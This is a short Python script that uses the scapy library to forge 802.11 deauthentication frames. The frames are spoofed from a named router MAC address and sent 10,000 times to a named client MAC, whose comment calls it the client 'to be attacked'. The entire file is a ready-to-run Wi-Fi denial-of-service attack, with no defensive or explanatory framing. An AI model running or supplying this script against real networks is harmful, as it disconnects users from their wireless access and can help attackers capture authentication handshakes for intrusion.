#!/usr/bin/env python3.9
import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth

brdmac = "ff:ff:ff:ff:ff:ff"

client_mac = "e8:f7:91:9f:f0:a0" # Mac id of client to be attacked

ap_mac = "18:02:ae:24:f0:ff"#9e:b8:bc:fd:29:e2"# Mac id of router to be attacked

dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)

pkt = RadioTap() / dot11 / Dot11Deauth(reason=22)

sendp(pkt, inter=0.5, iface="wlan1", count=10000, verbose=1)
 
